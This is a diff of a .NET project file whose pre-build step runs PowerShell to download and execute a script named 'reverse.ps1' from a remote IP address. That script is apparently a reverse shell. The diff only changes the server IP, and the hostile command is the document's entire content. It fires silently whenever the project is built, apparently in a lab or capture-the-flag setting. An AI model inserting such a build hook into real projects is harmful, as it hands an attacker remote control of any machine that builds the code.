@@ -7,7 +7,7 @@
     <Nullable>enable</Nullable>
   </PropertyGroup>
     <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.19:8000/reverse.ps1')" />
+    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.32:8000/reverse.ps1')" />
   </Target>
 
 </Project>
